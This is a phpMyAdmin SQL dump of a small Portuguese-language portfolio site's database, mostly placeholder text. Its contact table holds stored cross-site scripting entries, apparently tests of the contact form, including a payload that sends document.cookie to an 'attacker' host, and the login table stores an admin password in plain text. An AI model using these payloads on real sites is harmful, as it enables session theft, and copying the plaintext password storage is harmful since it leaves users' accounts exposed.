-- phpMyAdmin SQL Dump
-- version 4.6.5.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: 07-Maio-2017 às 03:53
-- Versão do servidor: 10.1.21-MariaDB
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `ativida`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `carreira`
--

CREATE TABLE `carreira` (
  `carrId` int(2) NOT NULL,
  `carrInicial` varchar(15) DEFAULT NULL,
  `carrFormAca` varchar(600) DEFAULT NULL,
  `carrIdiomas` varchar(100) DEFAULT NULL,
  `carrExp` varchar(700) DEFAULT NULL,
  `carrExpInt` varchar(300) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `carreira`
--

INSERT INTO `carreira` (`carrId`, `carrInicial`, `carrFormAca`, `carrIdiomas`, `carrExp`, `carrExpInt`) VALUES
(0, 'Lorem Ipsum', 'Lorem IpsumLorem IpsumLorem IpsumLorem Ipsum', 'Lorem Ipsum Lorem Ipsum', 'Lorem Ipsum', 'Lorem Ipsum');

-- --------------------------------------------------------

--
-- Estrutura da tabela `contato`
--

CREATE TABLE `contato` (
  `contId` int(2) NOT NULL,
  `contNome` varchar(50) DEFAULT NULL,
  `contEmail` varchar(30) DEFAULT NULL,
  `contAssunto` varchar(20) DEFAULT NULL,
  `contComent` varchar(300) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `contato`
--

INSERT INTO `contato` (`contId`, `contNome`, `contEmail`, `contAssunto`, `contComent`) VALUES
(1, 'ANA CLARA LOPES DA SILVA', 'ana.lopsil@gmail.com', 'asdasdas', 'asdasdas'),
(2, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'asdasd', 'asd <script>document.write(\'<img src=\"http://site.com?asdas=WASDASDASDASDASD\"/>\');document.write(\'<img src=\"https://s3.amazonaws.com/ceblog/wp-content/uploads/2016/04/22110359/youve-been-hacked.png\"/>\')</script>'),
(3, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'aaaa', 'asd <a href=# onclick=document.location=\'http://www.google.com\'>My Name</a>'),
(4, 'sad', 'asdas@asd.com', 'asd', '<script>window.location=\'http://attacker/?cookie=\'+document.cookie </script> '),
(5, 'das', 'dasd', 'asdas', '[removed][removed]=\'http://attacker/?cookie=\'+[removed] [removed]');

-- --------------------------------------------------------

--
-- Estrutura da tabela `home`
--

CREATE TABLE `home` (
  `homeId` int(2) NOT NULL,
  `homeMsgInicial` varchar(15) DEFAULT NULL,
  `homeMsgNavegar` varchar(100) DEFAULT NULL,
  `homeMsgComentar` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `login`
--

CREATE TABLE `login` (
  `idAdmin` int(2) NOT NULL,
  `usuario` varchar(10) DEFAULT NULL,
  `senha` int(8) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `login`
--

INSERT INTO `login` (`idAdmin`, `usuario`, `senha`) VALUES
(1, 'ana', 123123);

-- --------------------------------------------------------

--
-- Estrutura da tabela `sobre`
--

CREATE TABLE `sobre` (
  `sobreId` int(2) NOT NULL,
  `sobreMsgInicial` varchar(15) DEFAULT NULL,
  `sobreFoto` varchar(100) DEFAULT NULL,
  `sobreNomeCompleto` varchar(60) DEFAULT NULL,
  `sobreDadosBasicos` varchar(500) DEFAULT NULL,
  `sobreResumo` varchar(400) DEFAULT NULL,
  `sobreMetas` varchar(300) DEFAULT NULL,
  `sobreHobbies` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `sobre`
--

INSERT INTO `sobre` (`sobreId`, `sobreMsgInicial`, `sobreFoto`, `sobreNomeCompleto`, `sobreDadosBasicos`, `sobreResumo`, `sobreMetas`, `sobreHobbies`) VALUES
(0, 'Lorem ipsum', 'images/ana.jpg', 'Ana Clara', 'Lorem ipsum 123', 'Lorem ipsumLorem ipsumLorem ipsumLorem ipsum', 'Lorem ipsum Lorem ipsumLorem ipsumLorem ipsumLorem ipsum', 'Lorem ipsumLorem ipsumLorem ipsum Lorem ipsum');

-- --------------------------------------------------------

--
-- Estrutura da tabela `trabalho`
--

CREATE TABLE `trabalho` (
  `trabId` int(2) NOT NULL,
  `trabProjReal` varchar(500) DEFAULT NULL,
  `trabProjFut` varchar(500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `trabalho`
--

INSERT INTO `trabalho` (`trabId`, `trabProjReal`, `trabProjFut`) VALUES
(0, 'Lorem ipsum', 'Lorem ipsum');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `carreira`
--
ALTER TABLE `carreira`
  ADD PRIMARY KEY (`carrId`);

--
-- Indexes for table `contato`
--
ALTER TABLE `contato`
  ADD PRIMARY KEY (`contId`);

--
-- Indexes for table `home`
--
ALTER TABLE `home`
  ADD PRIMARY KEY (`homeId`);

--
-- Indexes for table `login`
--
ALTER TABLE `login`
  ADD PRIMARY KEY (`idAdmin`);

--
-- Indexes for table `sobre`
--
ALTER TABLE `sobre`
  ADD PRIMARY KEY (`sobreId`);

--
-- Indexes for table `trabalho`
--
ALTER TABLE `trabalho`
  ADD PRIMARY KEY (`trabId`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `contato`
--
ALTER TABLE `contato`
  MODIFY `contId` int(2) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
